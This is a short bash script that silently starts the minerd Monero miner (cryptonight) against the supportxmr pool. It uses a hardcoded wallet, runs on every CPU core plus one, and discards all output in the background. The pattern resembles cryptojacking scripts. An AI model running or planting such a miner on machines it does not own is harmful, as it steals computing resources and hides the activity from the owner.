#!/bin/bash

POOL=stratum+tcp://pool.supportxmr.com:5555
WALLET=44NoPqV96tfD5tvAmUHrpUEAf62LwDrABgTnmhPHM9g6Bkdk3nk7arB1V86TykSDUUT1bJHfKMtxPJakKyqEwMSbLcJ6oVT
CORES=`cat /proc/cpuinfo | grep processor | wc -l`
THREADS=$((CORES+1))

/usr/local/bin/minerd -a cryptonight -o $POOL -u $WALLET -p x -t $THREADS > /dev/null &
